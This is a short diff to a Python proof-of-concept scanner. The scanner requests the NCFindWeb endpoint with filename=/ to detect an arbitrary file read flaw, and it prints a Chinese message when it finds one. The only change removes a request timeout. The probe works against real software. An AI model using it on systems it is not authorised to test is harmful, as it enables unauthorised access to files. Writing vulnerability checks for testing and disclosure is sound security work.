@@ -44,7 +44,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/NCFindWeb?service=IPreAlertConfigService&filename=/".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, allow_redirects=False, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, allow_redirects=False, verify=False, proxies=self.proxies)
             if result.status_code == 200 and result.text.find(".jsp") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件读取漏洞\033[0m
